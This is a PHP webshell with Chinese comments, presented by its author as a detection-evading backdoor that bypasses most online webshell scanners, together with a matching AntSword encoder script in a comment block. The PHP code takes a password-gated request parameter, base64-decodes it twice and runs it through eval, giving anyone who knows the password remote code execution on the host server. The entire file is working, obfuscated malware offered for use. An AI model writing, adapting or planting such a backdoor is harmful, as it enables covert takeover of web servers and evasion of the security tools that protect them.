<?php
/*
 * @Author : 青山(一个大混子)
 * @PHP免杀测试
 * @使用方法：antswrod 自定义编码器 即可链接
 * @介绍：第一版php免杀木马 在线webshell检测：除长亭外基本全过 还是比较菜
 * @编码器：下方
 */

//此处是编码器
/*

'use strict';

module.exports = (pwd, data, ext = null) => {
    // 生成一个随机变量名
    let randomID;
    if (ext.opts.otherConf['use-random-variable'] === 1) {
        randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
    } else {
        randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
    }
    data[randomID] = Buffer
        .from(data['_'])
        .toString('base64');
    data[pwd] = pwd + Buffer.from(`@eval(@base64_decode($_POST['${randomID}']));`).toString('base64');
    data[pwd] = Buffer.from(data[pwd]).toString('base64');
    delete data['_'];
    return data;
}

*/

//去除报错
error_reporting(0);

class go extends PWAF {
    //password
    public $pass = "qingshan";

    public function run(){
        if($this->checkPass()){
            $param = $this->parser($this->getData());
            if($param){
                // echo $param;
                $Command = function ($param){ return @eval($param);};
                echo $this->pass($Command,$param);
            }else{
                echo "parser is wrong!";
            }
        }else{
            echo "pass is wrong!";
        }
    }
    //检查key
    public function checkPass(){
        if(isset($_REQUEST[$this->pass])){
            return true;
        }
        return false;
    }
    //获取请求数据
    public function getData(){
        $data = $_REQUEST[$this->pass];
        return $data;
    }
    //解析参数加密
    public function parser($param){
        $data = base64_decode($param);
        $key = substr($data,0,strlen($this->pass));
        if ($key == $this->pass){
            $data = substr_replace($data,'',0,strlen($this->pass));
            return base64_decode($data);
        }else{
            return false;
        }
    }
};

class PWAF {
    public function pass($command,$param){
        $res = call_user_func($command, $param);
        return $res;
    }
}

$a = new go();
$a->run();